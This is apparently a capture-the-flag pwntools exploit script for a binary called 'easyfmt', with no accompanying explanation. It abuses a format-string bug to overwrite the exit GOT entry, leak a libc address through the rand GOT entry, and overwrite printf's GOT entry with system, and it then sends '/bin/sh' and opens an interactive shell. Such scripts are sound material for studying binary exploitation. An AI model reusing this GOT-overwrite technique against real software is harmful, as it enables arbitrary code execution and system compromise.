#coding:utf-8
from pwn import *
debug = 1
context.log_level = 'debug'


r = 1

def leak(address):

	r.recvuntil('enter:')
	r.send('1')
	
	r.recvuntil('slogan')
	
	r.send(('\x01%%%d$s'%(10)).ljust(0x10, '\x01') + p64(address))
	
	r.recvuntil('\x01')

	content = r.recvuntil('\x01')[:-1]

	return content

	
	


def exp(debug):
	global r
	elf = ELF('./easyfmt')
	address = 0x0000000000400906
	loop = True
	while loop:
		try:
			if debug == 1:
				r = process('./easyfmt')
				#r = gdb.debug('./easyfmt', 'b *0x0000000000400905')
				#b *0x0000000004009DF
				lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
			else:
				r = 1

			r.recvuntil('enter:')
			r.send('1')	#暴力碰撞
	
			r.recvuntil('slogan')

			r.send(('%%%dc%%%d$hn'%(0x0906, 10)).ljust(0x10, 'a') + p64(elf.got['exit']))
				#r = gdb.debug('./easyfmt', 'b *0x0000000000400905')
			#b *0x00000000004009DF
			loop = False
		except EOFError:
			continue
	

	lib_base = u64(leak(elf.got['rand']).ljust(8, '\x00')) - lib.sym['rand']
	log.info('lib_base => %#x'%lib_base)

	r.recvuntil('enter:')
	r.send('1')	#暴力碰撞

	r.recvuntil('slogan')

	r.send((p64(elf.got['exit']) + p64(elf.got['printf']) + p64(elf.got['printf'] + 2)).ljust(0x100, '\x00'))



	log.info('lib_base => %#x system => %#x %#x'%(lib_base, lib_base + lib.sym['system'], (lib_base + lib.sym['system']) & 0xffff))

	content1 = (lib_base + lib.sym['system']) & 0xffff
	content2 = ((lib_base + lib.sym['system']) & 0xffffffff) >> 16


	r.recvuntil('enter:')
	r.send('1')	#暴力碰撞

	r.recvuntil('slogan')

	offset = int((0x7ffd84474db0 - 0x7ffd84474c70) / 0x8)
	r.send(('%%%dc%%%d$hn'%(0x09b2, 6 + offset) + '%%%dc%%%d$hn'%(0x10000 + content1 - 0x09b2, 7 + offset) + '%%%dc%%%d$hn'%(0x10000 + content2 - content1, 8 + offset)))
	r.recv()

	r.send('/bin/sh\x00')

	r.interactive()


exp(debug)
